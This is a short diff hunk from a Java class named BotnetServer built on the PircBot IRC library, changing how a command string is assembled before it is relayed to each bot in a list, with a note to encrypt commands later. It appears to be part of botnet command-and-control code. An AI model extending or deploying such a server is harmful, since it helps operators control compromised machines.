@@ -292,7 +292,7 @@ public class BotnetServer extends PircBot {
 					}
 					String command = parts[0];
 					for (int i = 2; i <= 5; i++) {
-						command += parts[i] + " ";
+						command += " " + parts[i];
 					}
 					for (String name : bots) {
 						// TODO: encrypt command
